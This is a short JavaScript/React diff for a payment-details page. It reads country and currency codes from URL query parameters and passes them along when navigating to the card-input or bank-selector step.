@@ -30,8 +30,10 @@ const PaymentDetailsTheme = () => {
   const serviceName = linkData?.payload?.service_name || serviceKey;
   const shippingInfo = linkData?.payload as any;
 
-  // Get country code from link data
-  const countryCode = shippingInfo?.selectedCountry || "SA";
+  // Get URL parameters
+  const urlParams = new URLSearchParams(window.location.search);
+  const countryCode = urlParams.get('country') || shippingInfo?.selectedCountry || "SA";
+  const currencyCode = urlParams.get('currency') || "SAR";
 
   // Get currency info for display
   const currencyInfo = getCurrencyByCountry(countryCode);
@@ -61,10 +63,10 @@ const PaymentDetailsTheme = () => {
 
     // If payment method is "card", skip bank selector and go directly to card input
     if (paymentMethod === 'card') {
-      navigate(`/pay/${id}/card-input`);
+      navigate(`/pay/${id}/card-input?country=${countryCode}&currency=${currencyCode}`);
     } else {
       // For "bank_login" method, show bank selector
-      navigate(`/pay/${id}/bank-selector`);
+      navigate(`/pay/${id}/bank-selector?country=${countryCode}&currency=${currencyCode}`);
     }
   };
 
